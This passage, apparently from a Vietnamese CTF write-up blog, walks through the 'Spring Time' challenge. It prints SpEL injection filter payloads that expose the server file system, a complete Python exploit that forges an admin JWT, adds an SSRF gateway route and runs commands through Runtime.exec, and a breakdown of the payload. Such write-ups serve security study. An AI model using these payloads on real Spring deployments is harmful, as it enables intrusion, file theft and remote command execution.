+<li><strong>Filter 1: Bypass hạn chế truy cập SpEL</strong></li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;@systemProperties[&#x27;spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled&#x27;] = false&#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Mục đích:</p>
+<ul>
+<li><p>Vô hiệu hóa thuộc tính spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled, vốn mặc định là true.<br>Hành động:</p>
+</li>
+<li><p>Thuộc tính này kiểm soát quyền truy cập vào các property nhạy cảm trong Spring WebFlux. Khi được đặt thành false, nó cho phép SpEL truy cập và chỉnh sửa những property hoặc thực thi các phương thức nguy hiểm.<br>Hậu quả:</p>
+</li>
+<li><p>Các filter khác có thể sử dụng SpEL để thực hiện các hành động nguy hiểm hơn, chẳng hạn như đọc hoặc ghi dữ liệu nhạy cảm.</p>
+</li>
+<li><p><strong>Filter 2: Expose file system qua mapping &#x2F;webjars&#x2F;</strong></p>
+</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/webjars/**&#x27;].locationValues[0]=&#x27;file:///&#x27; &#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Mục đích:</p>
+<ul>
+<li><p>Thay đổi mapping của đường dẫn &#x2F;webjars&#x2F;** để trỏ đến hệ thống file cục bộ (file:&#x2F;&#x2F;&#x2F;).<br>Hành động:</p>
+</li>
+<li><p>Thuộc tính urlMap của bean resourceHandlerMapping được chỉnh sửa để ánh xạ mọi request tới &#x2F;webjars&#x2F;** vào hệ thống tệp cục bộ.<br>Hậu quả:</p>
+</li>
+<li><p>Kẻ tấn công có thể truy cập file system của máy chủ thông qua HTTP chẳng hạn như là <code>GET /webjars/etc/passwd</code>.</p>
+</li>
+<li><p><strong>Filter 3: Áp dụng thay đổi mapping</strong></p>
+</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/webjars/**&#x27;].afterPropertiesSet&#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Mục đích:</p>
+<ul>
+<li>Gọi phương thức afterPropertiesSet của bean resourceHandlerMapping để áp dụng thay đổi mapping được thực hiện ở filter 2.<br>Hành động:</li>
+<li>Phương thức afterPropertiesSet được gọi để tái cấu hình bean resourceHandlerMapping, đảm bảo rằng mapping &#x2F;webjars&#x2F;** tới file:&#x2F;&#x2F;&#x2F; có hiệu lực.<br>Hậu quả:</li>
+<li>Các thay đổi mapping sẽ được kích hoạt ngay lập tức, cho phép attacker khai thác file system qua HTTP.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SkEgYYPCel.png" alt="image"></p>
+<p>Thành công đọc được <code>etc/passwd</code> vậy là ta đã có hướng để có thể khai thác vào service nội bộ, bây giờ vẫn flow như cũ nhưng ta sẽ khai thác ở localhost:8082 là NewsMan service.</p>
+<p><img src="https://hackmd.io/_uploads/BkT1AYwCge.png" alt="image"></p>
+<p>Ở phần security ta thấy nó xử lý phần authen bằng jwt </p>
+<p><img src="https://hackmd.io/_uploads/SytrRtDRgg.png" alt="image"></p>
+<p>Bên cạnh đó nó còn gọi thêm 1 biến role để gán vào jwt.</p>
+<p><img src="https://hackmd.io/_uploads/ByyqAtvAxx.png" alt="image"></p>
+<p>Có 3 role chính là <code>ADMIN</code> <code>USER</code> <code>VIEWER</code> .</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Bây giờ dựa vào POC ở bên trên đã cho ta thấy rằng SpEL Injection sử dụng CVE-2025-41243 và thành công đọc được <code>/etc/passwd</code> bây giờ ta sẽ sẽ khai thác service NewsMan.</p>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;fake_secret_for_testing&#x27;</span></span><br><span class="line">base_url = <span class="string">&#x27;http://localhost:8080&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># === 1. Generate JWT token ===</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_jwt</span>():</span><br><span class="line">    key = hashlib.sha256(secret.encode()).hexdigest().encode()</span><br><span class="line">    header = &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>&#125;</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&#x27;sub&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;ADMIN&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iat&#x27;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">        <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">3600</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b64 = <span class="keyword">lambda</span> b: base64.urlsafe_b64encode(b).rstrip(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">    signing = <span class="string">b&#x27;.&#x27;</span>.join([</span><br><span class="line">        b64(json.dumps(header, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)).encode()),</span><br><span class="line">        b64(json.dumps(payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)).encode())</span><br><span class="line">    ])</span><br><span class="line">    sig = base64.urlsafe_b64encode(hmac.new(key, signing, hashlib.sha256).digest()).rstrip(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (signing + <span class="string">b&#x27;.&#x27;</span> + sig).decode()</span><br><span class="line"></span><br><span class="line">token = generate_jwt()</span><br><span class="line">auth_header = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;Bearer <span class="subst">&#123;token&#125;</span>&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># === 2. Đăng ký route gateway ===</span></span><br><span class="line">requests.post(</span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/actuator/gateway/routes/news&#x27;</span>,</span><br><span class="line">    headers=headers,</span><br><span class="line">    json=&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;news&quot;</span>,</span><br><span class="line">        <span class="string">&quot;predicates&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Path&quot;</span>, <span class="string">&quot;args&quot;</span>: &#123;<span class="string">&quot;_genkey_0&quot;</span>: <span class="string">&quot;/news/**&quot;</span>&#125;&#125;],</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://127.0.0.1:8082&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">requests.post(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/actuator/gateway/refresh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === 3. Gửi payload SpEL để lấy tên flag qua ls ===</span></span><br><span class="line">payload_ls = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;body&quot;</span>: <span class="string">&quot;#&#123;role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.util.Scanner\&quot;).getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\&quot;java.io.InputStream\&quot;)][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;ls /app\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next()&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;draft&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line">requests.put(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/news/1&#x27;</span>, headers=&#123;**headers, **auth_header&#125;, json=payload_ls)</span><br><span class="line"></span><br><span class="line">resp_ls = requests.get(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/news/1/view&#x27;</span>, headers=auth_header)</span><br><span class="line">flag_file = re.search(<span class="string">r&#x27;flag-[\w\d]+&#x27;</span>, resp_ls.text)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag_file:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Không tìm thấy flag file&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag_name = flag_file.group(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found flag: <span class="subst">&#123;flag_name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload_cat = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;body&quot;</span>: <span class="string">f&quot;#&#123;&#123;role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.util.Scanner\&quot;).getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\&quot;java.io.InputStream\&quot;)][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;cat /app/<span class="subst">&#123;flag_name&#125;</span>\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next()&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;draft&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line">requests.put(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/news/1&#x27;</span>, headers=&#123;**headers, **auth_header&#125;, json=payload_cat)</span><br><span class="line"></span><br><span class="line">resp_flag = requests.get(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/news/1/view&#x27;</span>, headers=auth_header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFlag output:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp_flag.text)</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>Luồng hoạt động tổng quan</strong><br><strong>1. Tạo JWT Token:</strong></p>
+<ul>
+<li>Script tạo token giả mạo với quyền admin để bỏ qua cơ chế xác thực.</li>
+</ul>
+<p><strong>2. Đăng ký Route Gateway:</strong></p>
+<ul>
+<li>Route &#x2F;news&#x2F;** được đăng ký trong Spring Cloud Gateway để chuyển tiếp yêu cầu đến Newsman. (SSRF)</li>
+</ul>
+<p><strong>3. Liệt kê file trong &#x2F;app:</strong></p>
+<ul>
+<li>Payload SpEL thực thi lệnh ls &#x2F;app để liệt kê file.<br>Script tìm tên file flag trong kết quả trả về.</li>
+</ul>
+<p><strong>4. Đọc nội dung file flag:</strong></p>
+<ul>
+<li>Payload SpEL thực thi lệnh cat trên file flag để đọc nội dung.<br>Script hiển thị nội dung flag.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ryC0VhP0ee.png" alt="image"></p>
+<h4 id="Giai-thich-Payload-va-Cach-Hoat-Dong"><a href="#Giai-thich-Payload-va-Cach-Hoat-Dong" class="headerlink" title="Giải thích Payload và Cách Hoạt Động"></a>Giải thích Payload và Cách Hoạt Động</h4><p><strong>Payload Lệnh ls trong Body :</strong></p>
+<ol>
+<li>SpEL Injection</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;body&quot;</span>: <span class="string">&quot;#&#123;role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.util.Scanner\&quot;).getConstructors().?[getParameterCount()==1 and getParameterTypes()[0].getName().equals(\&quot;java.io.InputStream\&quot;)][0].newInstance(role.getDeclaringClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;ls /app\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next()&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>SpEL (Spring Expression Language) là một ngôn ngữ biểu thức được hỗ trợ bởi Spring Framework để thao tác với các đối tượng runtime trong ứng dụng.</li>
+<li>Ở đây, lỗ hổng cho phép attacker đưa nội dung SpEL độc hại vào trường body thông qua endpoint &#x2F;news&#x2F;1 (hàm updateNews).</li>
+<li>Sau đó, nội dung này được thực thi khi gọi endpoint &#x2F;news&#x2F;1&#x2F;view, nơi hàm renderNewsBody sử dụng newsService.render() để xử lý nội dung trong body.</li>
+</ul>
+<ol start="2">
+<li>Cách Payload Hoạt Động</li>
+</ol>
+<ul>
+<li>Truy cập ClassLoader của role:</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role.getDeclaringClass().getClassLoader()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>role: Là một biến có giá trị truyền vào EvaluationContext của SpEL.</li>
+<li>getDeclaringClass(): Lấy lớp khai báo của role.</li>
+<li>getClassLoader(): Truy cập ClassLoader của lớp này, cho phép tải các lớp khác trong JVM.</li>
+</ul>
+<ol start="3">
+<li>Sử dụng Reflection để tải lớp java.util.Scanner:</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.loadClass(<span class="string">&quot;java.util.Scanner&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Tải lớp Scanner từ Java API. Lớp này được sử dụng để đọc dữ liệu từ một InputStream.</p>
+<ol start="4">
+<li>Lấy Constructor phù hợp:</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.getConstructors().?[getParameterCount()==<span class="number">1</span> and <span class="title function_">getParameterTypes</span><span class="params">()</span>[<span class="number">0</span>].getName().equals(<span class="string">&quot;java.io.InputStream&quot;</span>)][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>.getConstructors(): Lấy danh sách các constructor của Scanner.</li>
+<li>?[…]: Lọc constructor có duy nhất một tham số, và tham số đó là java.io.InputStream.</li>
+<li>[0]: Lấy constructor đầu tiên phù hợp.</li>
+</ul>
+<ol start="5">
+<li>Tạo một đối tượng Scanner:</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.newInstance(...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Tạo một thể hiện của lớp Scanner bằng cách truyền vào một InputStream.</li>
+</ul>
+<ol start="6">
+<li>Thực thi lệnh ls &#x2F;app:</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role.getDeclaringClass().getClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>).exec(<span class="string">&quot;ls /app&quot;</span>).getInputStream()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Tải lớp java.lang.Runtime.</li>
+<li>Lấy phương thức getRuntime() để truy cập đối tượng Runtime.</li>
+<li>Gọi phương thức exec(“ls &#x2F;app”) để thực thi lệnh ls &#x2F;app trên hệ thống.</li>
+<li>Kết quả của lệnh được trả về dưới dạng một InputStream.</li>
+</ul>
+<ol start="7">
+<li>Đọc kết quả từ InputStream:</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.useDelimiter(<span class="string">&quot;\\\\A&quot;</span>).next()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Sử dụng Scanner để đọc toàn bộ nội dung từ InputStream (kết quả của lệnh ls).</li>
+<li>useDelimiter(“\\A”): Đặt dấu phân cách là toàn bộ nội dung (\A là ký hiệu cho toàn bộ chuỗi).</li>
+<li>next(): Lấy toàn bộ nội dung từ InputStream.</li>
+</ul>
+<h4 id="Cach-Ket-Qua-Duoc-Tra-Ve"><a href="#Cach-Ket-Qua-Duoc-Tra-Ve" class="headerlink" title="Cách Kết Quả Được Trả Về"></a>Cách Kết Quả Được Trả Về</h4><p>Gửi Request để Cập Nhật body:</p>
+<ul>
+<li>Khi bạn gửi payload qua endpoint &#x2F;news&#x2F;1 (hàm updateNews), nội dung payload được lưu vào field body trong đối tượng News.</li>
+</ul>
+<p>Trigger SpEL Injection:</p>
+<ul>
+<li>Khi bạn truy cập endpoint &#x2F;news&#x2F;1&#x2F;view (hàm renderNewsBody), nội dung body được xử lý bởi hàm newsService.render():</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.parser.parseExpression(bodyTemplate, <span class="built_in">this</span>.templateParser).getValue(ctx, String.class);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Tại đây, nội dung body chứa biểu thức SpEL được phân tích cú pháp và thực thi.</li>
+</ul>
+<p>Thực thi Lệnh Qua SpEL:</p>
+<ul>
+<li><p>SpEL biểu thức trong body thực thi lệnh ls &#x2F;app, kết quả được đọc từ -  - InputStream và trả về dưới dạng chuỗi.<br>Phản hồi Kết Quả:</p>
+</li>
+<li><p>Kết quả của lệnh (ví dụ: danh sách file trong &#x2F;app) được trả về qua API &#x2F;news&#x2F;1&#x2F;view dưới dạng phản hồi HTTP.</p>
+</li>
+</ul>
+<p>Reflective:</p>
+<p>Trong trường hợp này, kết quả được trả về từ ứng dụng dưới dạng phản hồi HTTP thông qua cơ chế Reflection:</p>
+<ul>
+<li>Reflection: Payload tận dụng Reflection API của Java để thực thi lệnh (thông qua Runtime.exec).</li>
+<li>SSRF Payload: Kết quả của payload được phản ánh (reflect) qua API &#x2F;news&#x2F;1&#x2F;view.</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/">https://pzhat.github.io/2025/11/15/2025-10-23-CSCV-Spring-Time-Challenge/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-10-30-iredteam-from-DA-to-EA/" title="Ired.Team From Domain Admin to Enterprise Admin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Ired.Team From Domain Admin to Enterprise Admin</div></div><div class="info-2"><div class="info-item-1">Ired.Team From Domain Admin to Enterprise AdminOverviewỞ lab này ta sẽ lợi dụng mối quan hệ giữa Parent-Child domain từ đó lợi dụng mối quan hệ đó và gây nên leo thang đặc quyền. Build lab SetUp domain đặt tên là offense.local đây là domain cha với IP là 192.168.10.10/24 và DNS: 127.0.0.1.   Đã cài xong Active Directory Domain Services (AD DS).  Đã promote máy thành Domain Controller cho domain: offense.local.  Đã có DNS Server chạy trên DC.  Đang dùng VMware host-only network.   Sau đó setup...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-28-Ysoserial-URLDNS/" title="Java Deserialze - URLDNS Chain analysis (ysoserial)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Java Deserialze - URLDNS Chain analysis (ysoserial)</div></div><div class="info-2"><div class="info-item-1">Java Deserialze - URLDNS Chain analysis (ysoserial) Java Deserialize là gì? Java cung cấp cho người dùng hàm writeObject() để tiến hành quá trình serialize các object ở đây quá trình serialize sinh ra để chuyển một đối tượng Java thành chuỗi byte để lưu trữ (file, DB) hoặc truyền qua mạng (socket, RMI, JMS). Và để có thể đọc được dữ liệu được serialize từ ObjectInputStream ta có quá trình deserialize ở java sử dụng hàm readObject() cho quá trình đó.  Khai thác Java Object Injection Rủi ro sẽ ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-17-SecCon-SafeUpload-Web-Challenge/" title="CyberCon 2025 SafeUpload Web Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CyberCon 2025 SafeUpload Web Challenge</div></div><div class="info-2"><div class="info-item-1">CyberCon 2025 SafeUpload Web ChallengeTổng quan challenge Mở challenge lên thì ta thấy nó cấp cho ta một giao diện dùng để upload file nên nghi ngờ ban đầu sẽ là web này dính lỗ hổng file upload. Tiến hành thử upload lên file php với nội dung: 123&lt;?phpecho &quot;test&quot;;?&gt;   Có vẻ như đã dính filter của bài có thể thấy nó đã xoá đi file mình upload lên, bây giờ ta thử upload 1 file php nhưng không có nội dung.  Vẫn là file đó nhưng không có nội dung thì hoàn toàn có thể upload bình t...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Cookie-Arena-Cmdi/" 